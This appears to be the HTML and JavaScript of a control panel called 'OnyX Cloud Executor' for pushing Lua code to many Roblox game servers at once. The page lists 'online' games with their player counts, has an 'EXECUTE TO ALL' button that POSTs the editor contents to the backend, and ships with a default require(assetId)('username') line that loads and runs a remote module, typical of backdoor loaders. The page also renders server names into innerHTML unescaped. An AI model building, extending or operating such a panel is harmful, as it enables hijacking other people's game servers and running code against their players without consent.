<!DOCTYPE html>
<html>
<head>
    <title>OnyX Cloud Executor</title>
    <style>
        body { background: #080808; color: white; font-family: 'Segoe UI', sans-serif; display: flex; margin: 0; height: 100vh; }
        .sidebar { width: 280px; background: #111; border-right: 1px solid #222; padding: 20px; overflow-y: auto; }
        .editor-container { flex: 1; display: flex; flex-direction: column; padding: 20px; }
        textarea { flex: 1; background: #000; color: #00ff41; border: 1px solid #333; border-radius: 8px; padding: 15px; font-family: 'Consolas', monospace; font-size: 14px; outline: none; }
        .btn { background: #fff; color: #000; border: none; padding: 15px; margin-top: 15px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: #ccc; }
        .server-card { background: #1a1a1a; border: 1px solid #333; padding: 10px; border-radius: 6px; margin-bottom: 10px; }
        .status { color: #00ff41; font-size: 12px; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h3>Servers Online</h3>
        <div id="server-list">Searching...</div>
    </div>
    <div class="editor-container">
        <h2>OnyX Cloud <span style="opacity: 0.5;">v1.0</span></h2>
        <textarea id="code">-- Type your Lua code here
print("Server connected!")
require(104786344839667)("Not_an9e15")</textarea>
        <button class="btn" onclick="execute()">EXECUTE TO ALL</button>
    </div>

    <script>
        async function execute() {
            const code = document.getElementById('code').value;
            await fetch('/update_script', { method: 'POST', body: code });
            alert("Sent!");
        }

        async function refresh() {
            try {
                const res = await fetch('/get_games');
                const data = await res.json();
                const list = document.getElementById('server-list');
                list.innerHTML = Object.values(data).map(s => `
                    <div class="server-card">
                        <b>${s.gameName}</b><br>
                        <span class="status">● Online</span><br>
                        <small>Players: ${s.playerCount}/${s.maxPlayers}</small>
                    </div>
                `).join('') || "No servers found";
            } catch(e) {}
        }
        setInterval(refresh, 5000);
    </script>
</body>
</html>
